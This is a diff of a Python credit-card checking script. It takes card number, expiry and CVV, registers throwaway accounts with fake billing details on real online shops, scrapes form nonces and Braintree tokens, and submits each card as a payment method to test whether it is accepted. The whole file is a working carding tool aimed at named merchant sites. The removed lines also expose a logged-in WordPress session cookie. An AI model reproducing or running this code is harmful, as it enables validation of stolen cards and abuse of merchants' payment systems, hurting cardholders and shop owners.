@@ -204,7 +204,7 @@ def Tele2(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()	
 	headers = {'authority': 'wiredministries.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW','origin': 'https://wiredministries.com','referer': 'https://wiredministries.com/products/donate','sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1', 'upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',}
-	data = '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="utf8"\r\n\r\n✓\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="add"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
+	data = '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="utf8"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="add"\r\n\r\n\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\nContent-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
 	response = r.post('https://wiredministries.com/cart/add', cookies=r.cookies, headers=headers, data=data)
 	headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://wiredministries.com', 'priority': 'u=0, i','referer': 'https://wiredministries.com/cart','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
 	data = {'updates[]': '2', 'note': '', 'checkout': 'Check out'}
@@ -224,17 +224,17 @@ def Tele2(ccx):
 	else:
 		mssgg=re.search(r'"code":"(.*?)"', msg).group(1)
 		return ''+mssgg+''
+
 	
-		
 def Tele(ccx):
 	import requests
 	import re
+	from re import findall
 	import random
 	import string
+	import user_agent
 	import base64
-	
-
-
+	from user_agent import generate_user_agent
 	ccx = ccx.strip()
 	parts = re.split(r'[ |/]', ccx)
 	c = parts[0]
@@ -253,85 +253,155 @@ def Tele(ccx):
 	        yy = ex[0] + '7'
 	    else:
 	        pass
+	r=requests.session()
+	user = user_agent.generate_user_agent()
+	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+	email = f"{username}@gmail.com"
+	user = generate_user_agent()
 	r = requests.session()
 
-	
-	cookies = {
-    'INGRESSCOOKIE': '1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e',
-    'wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660',
-    'wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91': '65jatlrq4o7x6a018jtw',
-    'wp_automatewoo_session_started': '1',
-    '__cf_bm': 'MpFvLPcAoZduyWobryIB.sAj961t897_SPHt0ofiE_A-1742703605-1.0.1.1-VmuZAlWHXRHeGIIMrDyhCrk_r5oBXsnYTlr2O6JE7sc4qEJtlW9DFnJJBwHWC.bKvS0wXTyChB8GFKy4P.A2z_62jWQ7h1LG.wcCFMix5Mg',
+
+	headers={
+'User-Agent': user,
 }
-	headers = {
-    'authority': 'infinitediscsvipclub.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    # 'cookie': 'INGRESSCOOKIE=1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e; wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660; wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91=65jatlrq4o7x6a018jtw; wp_automatewoo_session_started=1; __cf_bm=MpFvLPcAoZduyWobryIB.sAj961t897_SPHt0ofiE_A-1742703605-1.0.1.1-VmuZAlWHXRHeGIIMrDyhCrk_r5oBXsnYTlr2O6JE7sc4qEJtlW9DFnJJBwHWC.bKvS0wXTyChB8GFKy4P.A2z_62jWQ7h1LG.wcCFMix5Mg',
-    'referer': 'https://infinitediscsvipclub.com/my-account/payment-methods/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}	
-	response = r.get('https://infinitediscsvipclub.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
+
+	rrr=r.get("https://www.bebebrands.com/my-account/add-payment-method/",headers=headers)
+	login=findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
+	print(login)
+
+
+
 	
-	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
+	
+
+
+
+
+
+
+
+
+	headers={
+'User-Agent': user,
+}
+
+	data = {
+    'username': email,
+    'email':email ,
+    'password': 'igxyfse7r77e58e88e84ies47s48e',
+    'wc_order_attribution_source_type': 'typein',
+    'wc_order_attribution_referrer': '(none)',
+    'wc_order_attribution_utm_campaign': '(none)',
+    'wc_order_attribution_utm_source': '(direct)',
+    'wc_order_attribution_utm_medium': '(none)',
+    'wc_order_attribution_utm_content': '(none)',
+    'wc_order_attribution_utm_id': '(none)',
+    'wc_order_attribution_utm_term': '(none)',
+    'wc_order_attribution_utm_source_platform': '(none)',
+    'wc_order_attribution_utm_creative_format': '(none)',
+    'wc_order_attribution_utm_marketing_tactic': '(none)',
+    'wc_order_attribution_session_entry': 'https://www.bebebrands.com/my-account/add-payment-method/',
+    'wc_order_attribution_session_start_time': '2025-03-30 06:24:01',
+    'wc_order_attribution_session_pages': '8',
+    'wc_order_attribution_session_count': '1',
+    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'woocommerce-register-nonce': login,
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'register': 'Register',
+}
+
+
+	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data)
+
+
+
+
+
+	headers={
+'User-Agent': user,
+}
+
+	 
+	addadres = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
+	
+	 
+	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addadres.text).group(1)
+	print(address)
+
+
+
+
+
+
+	headers={
+'User-Agent': user,
+}
+
+	data = {
+    'billing_first_name': 'Jhon Cena',
+    'billing_last_name': 'Tera daddy',
+    'billing_company': 'Lund khao',
+    'billing_country': 'GB',
+    'billing_address_1': 'Near Walmart 45',
+    'billing_address_2': 'RT 34 riad 456',
+    'billing_city': 'New york',
+    'billing_state': 'New York',
+    'billing_postcode': 'S16 1XB',
+    'billing_phone': '6499494949',
+    'billing_email': email,
+    'save_address': 'Save address',
+    'woocommerce-edit-address-nonce': address,
+    '_wp_http_referer': '/my-account/edit-address/billing/',
+    'action': 'edit_address',
+}
+
+	response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data)
+	
+
+
+
+
+
+
+
+	headers={
+'User-Agent': user,
+}
+
+	rrr=r.get("https://www.bebebrands.com/my-account/add-payment-method/",headers=headers)
+	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
 	print(nonce)
-	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
+	client=findall(
+        r'"client_token_nonce":"(.*?)"', rrr.text)[0]   
 	print(client)
-
-
-
-
-
-	cookies = {
-    'wordpress_sec_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7Cfe992c987751ab1496ab3efd3a4ca9a9a2cc0cd84c03706f9760dfca210e894d',
-    'INGRESSCOOKIE': '1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e',
-    'wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660',
-    'wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91': '65jatlrq4o7x6a018jtw',
-    'wp_automatewoo_session_started': '1',
-    '__cf_bm': 'xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
-}
-
+	
 	headers = {
-    'authority': 'infinitediscsvipclub.com',
+    'authority': 'www.bebebrands.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'cookie': 'wordpress_sec_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7Cfe992c987751ab1496ab3efd3a4ca9a9a2cc0cd84c03706f9760dfca210e894d; INGRESSCOOKIE=1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e; wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660; wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91=65jatlrq4o7x6a018jtw; wp_automatewoo_session_started=1; __cf_bm=xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
-    'origin': 'https://infinitediscsvipclub.com',
-    'referer': 'https://infinitediscsvipclub.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'origin': 'https://www.bebebrands.com',
+    'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
     'x-requested-with': 'XMLHttpRequest',
 }
-
-	
 	
 	data = {
     'action': 'wc_braintree_credit_card_get_client_token',
     'nonce': client,
 }
-		
-	response = r.post('https://infinitediscsvipclub.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
-	print(response.json())
-
-	enc = response.json()['data']	
-	dec = base64.b64decode(enc).decode('utf-8')
-	auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
-	print(auth)
-
+	
+	rrr=r.post("https://www.bebebrands.com/wp-admin/admin-ajax.php", headers=headers, data=data)		
+	enc = rrr.json()['data']	
+	decoded_text = base64.b64decode(enc).decode('utf-8')
+	au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
+	print(au)
 
 
 
@@ -341,25 +411,25 @@ def Tele(ccx):
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
-    'authorization': f'Bearer {auth}',
+    'authorization': f'Bearer {au}',
     'braintree-version': '2018-05-10',
     'content-type': 'application/json',
     'origin': 'https://assets.braintreegateway.com',
     'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
 }
 
 	json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'e018c633-5ad4-41f9-87ba-688334a689e1',
+        'sessionId': 'b345ada0-c1b3-4fb8-8016-c2766b458acf',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -367,7 +437,7 @@ def Tele(ccx):
             'creditCard': {
                 'number': c,
                 'expirationMonth': mm,
-                'expirationYear': yy,
+                'expirationYear': ex,
                 'cvv': cvc,
             },
             'options': {
@@ -378,103 +448,49 @@ def Tele(ccx):
     'operationName': 'TokenizeCreditCard',
 }
 
+
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-
-
 	tok=(response.json()['data']['tokenizeCreditCard']['token'])
-	
-	headers = {
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'Authorization': f'Bearer {auth}',
-    'Braintree-Version': '2018-05-10',
-    'Content-Type': 'application/json',
-    'Referer': 'https://infinitediscsvipclub.com/',
-    'sec-ch-ua-platform': '"Android"',
-}
-	json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': '86cf8139-6e03-4aad-80e2-f6e39f84fb66',
-    },
-    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
-    'operationName': 'ClientConfiguration',
-}
-	
-	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	print(tok)
 
 
 
 
 
-	cookies = {
-    'INGRESSCOOKIE': '1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e',
-    'wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660',
-    'wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91': '65jatlrq4o7x6a018jtw',
-    'wp_automatewoo_session_started': '1',
-    '__cf_bm': 'xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
+	headers={
+'User-Agent': user,
 }
 
-	
-	headers = {
-    'authority': 'infinitediscsvipclub.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'INGRESSCOOKIE=1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e; wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660; wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91=65jatlrq4o7x6a018jtw; wp_automatewoo_session_started=1; __cf_bm=xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
-    'origin': 'https://infinitediscsvipclub.com',
-    'referer': 'https://infinitediscsvipclub.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-	
-	
-	
-	
-	
-	
 	data = [
     ('payment_method', 'braintree_credit_card'),
-    ('wc-braintree-credit-card-card-type', 'visa'),
+    ('wc-braintree-credit-card-card-type', 'master-card'),
     ('wc-braintree-credit-card-3d-secure-enabled', ''),
     ('wc-braintree-credit-card-3d-secure-verified', ''),
     ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
     ('wc_braintree_credit_card_payment_nonce', tok),
-    ('wc_braintree_device_data', '{"correlation_id":"58a93dcfd3b55007cc70a82bb3f18c18"}'),
+    ('wc_braintree_device_data', '{"correlation_id":"aeedb227d827de219bca31d9c4eedf00"}'),
     ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
     ('wc_braintree_paypal_payment_nonce', ''),
-    ('wc_braintree_device_data', '{"correlation_id":"58a93dcfd3b55007cc70a82bb3f18c18"}'),
+    ('wc_braintree_device_data', '{"correlation_id":"aeedb227d827de219bca31d9c4eedf00"}'),
     ('wc-braintree-paypal-context', 'shortcode'),
     ('wc_braintree_paypal_amount', '0.00'),
-    ('wc_braintree_paypal_currency', 'USD'),
-    ('wc_braintree_paypal_locale', 'en_us'),
+    ('wc_braintree_paypal_currency', 'GBP'),
+    ('wc_braintree_paypal_locale', 'en_gb'),
     ('wc-braintree-paypal-tokenize-payment-method', 'true'),
     ('woocommerce-add-payment-method-nonce', nonce),
     ('_wp_http_referer', '/my-account/add-payment-method/'),
     ('woocommerce_add_payment_method', '1'),
-    ('ct_bot_detector_event_token', 'e83dac61bbd5d4abc81fc4529ffcb8372bb3d9142c9903b550360ab222b584e7'),
-    ('apbct_visible_fields', 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3Y19icmFpbnRyZWVfcGF5cGFsX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1wYXlwYWwtY29udGV4dCB3Y19icmFpbnRyZWVfcGF5cGFsX2Ftb3VudCB3Y19icmFpbnRyZWVfcGF5cGFsX2N1cnJlbmN5IHdjX2JyYWludHJlZV9wYXlwYWxfbG9jYWxlIHdjLWJyYWludHJlZS1wYXlwYWwtdG9rZW5pemUtcGF5bWVudC1tZXRob2Qgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6MTl9fQ=='),
-    ('ct_no_cookie_hidden_field', '_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiY3RfYm90X2RldGVjdG9yX2Zvcm1fZXhjbHVzaW9uIjp0cnVlLCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X2Nvb2tpZXNfdHlwZSI6Im5vbmUiLCJhcGJjdF9oZWFkbGVzcyI6ZmFsc2UsImFwYmN0X3Zpc2libGVfZmllbGRzIjoie1widmlzaWJsZV9maWVsZHNcIjpcIlwiLFwidmlzaWJsZV9maWVsZHNfY291bnRcIjowLFwiaW52aXNpYmxlX2ZpZWxkc1wiOlwid2MtYnJhaW50cmVlLWNyZWRpdC1jYXJkLWNhcmQtdHlwZSB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLWVuYWJsZWQgd2MtYnJhaW50cmVlLWNyZWRpdC1jYXJkLTNkLXNlY3VyZS12ZXJpZmllZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLW9yZGVyLXRvdGFsIHdjX2JyYWludHJlZV9jcmVkaXRfY2FyZF9wYXltZW50X25vbmNlIHdjX2JyYWludHJlZV9kZXZpY2VfZGF0YSB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtdG9rZW5pemUtcGF5bWVudC1tZXRob2Qgd2NfYnJhaW50cmVlX3BheXBhbF9wYXltZW50X25vbmNlIHdjX2JyYWludHJlZV9kZXZpY2VfZGF0YSB3Yy1icmFpbnRyZWUtcGF5cGFsLWNvbnRleHQgd2NfYnJhaW50cmVlX3BheXBhbF9hbW91bnQgd2NfYnJhaW50cmVlX3BheXBhbF9jdXJyZW5jeSB3Y19icmFpbnRyZWVfcGF5cGFsX2xvY2FsZSB3Yy1icmFpbnRyZWUtcGF5cGFsLXRva2VuaXplLXBheW1lbnQtbWV0aG9kIHdvb2NvbW1lcmNlLWFkZC1wYXltZW50LW1ldGhvZC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIHdvb2NvbW1lcmNlX2FkZF9wYXltZW50X21ldGhvZCBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gYXBiY3RfdmlzaWJsZV9maWVsZHMgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZFwiLFwiaW52aXNpYmxlX2ZpZWxkc19jb3VudFwiOjIwfSIsImN0X2ZrcF90aW1lc3RhbXAiOjE3NDI3MDQyNTUsImN0X3NjcmVlbl9pbmZvIjoie1wiZnVsbFdpZHRoXCI6MzYwLFwiZnVsbEhlaWdodFwiOjExMjcsXCJ2aXNpYmxlV2lkdGhcIjozNjAsXCJ2aXNpYmxlSGVpZ2h0XCI6NjU0fSIsImN0X2NoZWNranMiOjQyNDk4MjYwOSwiY3RfdGltZXpvbmUiOjUuNSwiY3RfY2hlY2tlZF9lbWFpbHMiOiIwIiwiY3RfaGFzX2tleV91cCI6InRydWUiLCJjdF9wc190aW1lc3RhbXAiOjE3NDI3MDQwNzIsImFwYmN0X3BhZ2VfaGl0cyI6MjEsImN0X2hhc19pbnB1dF9mb2N1c2VkIjoidHJ1ZSIsImN0X3BvaW50ZXJfZGF0YSI6IltdIiwiYXBiY3Rfc2Vzc2lvbl9pZCI6ImRvanhmIiwiYXBiY3RfcHJldl9yZWZlcmVyIjoiaHR0cHM6Ly9pbmZpbml0ZWRpc2NzdmlwY2x1Yi5jb20vbXktYWNjb3VudC9wYXltZW50LW1ldGhvZHMvIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL2luZmluaXRlZGlzY3N2aXBjbHViLmNvbS9teS1hY2NvdW50L2FkZC1wYXltZW50LW1ldGhvZC8iLCJ0eXBvIjpbXSwiY29sbGVjdGluZ191c2VyX2FjdGl2aXR5X2RhdGEiOnsiY2xpY2tzIjoxfX0='),
 ]
 
-	response = requests.post(
-    'https://infinitediscsvipclub.com/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
+
+	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data)
+
+
+
+
+
+
 	text = response.text
-	
 		
 	pattern = r'Reason: (.+?)\s*</li>'
 		
@@ -514,4 +530,5 @@ def Tele(ccx):
 	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
 		    return 'Approved ✅!'
 	else:
-		return result		
+		return result	
+		
